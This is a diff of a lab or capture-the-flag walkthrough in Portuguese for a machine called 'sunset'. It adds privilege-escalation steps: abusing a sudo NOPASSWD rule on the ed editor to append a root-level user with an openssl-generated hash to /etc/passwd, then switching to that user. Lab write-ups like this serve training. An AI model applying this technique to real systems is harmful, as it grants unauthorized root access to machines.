@@ -64,20 +64,48 @@ Use tools like Metasploit, Hydra, or custom scripts.
 ssh sunset@10.10.10.6
 sudo -l
 
+User sunset may run the following commands on sunset:
+    (root) NOPASSWD: /usr/bin/ed
+sunset@sunset:~$ sudo /usr/bin/ed  /etc/passwd
+
+Em outro termi
+ openssl passwd -1 -salt zak batata
+$1$zak$VbEQapB4mpickfJIMyL1v0
+
 
 
 6. Privilege Escalation
 Attempt to escalate privileges from a limited user to root.
 Explore file permissions, configuration files, and environment variables.
 
-No need
+(Aqui vimos quais arquivos ele tem aceso como root, neste caso é um editor de texto, vamos usar essa vulnerabilidade para escalar privilegio de root)
+Em outro terminam vamos criar nosso user e senha pra add la no passwd do ssh
+
+ openssl passwd -1 -salt zak batata (vamos criar um usuario e senha)
+$1$zak$VbEQapB4mpickfJIMyL1v0
+vamos agora para ssh
+
+sudo /usr/bin/ed  /etc/passwd
+1756
+a
+usuario que vc criou:hash criada pelo openssl:0:0:root:/root:/bin/bash
+.
+w
+1815
+w /etc/passwd
+1815
+q
+
+su usuario que vc criou
+whoami 
+root
 
 
 7. Post-Exploitation
 Maintain access, collect additional flags, or prepare for further exploitation.
 Investigate further vulnerabilities and opportunities for additional access.
 
-
+no need
 
 8. Flag Collection
 Locate and capture flags (usually text files or output from certain commands).
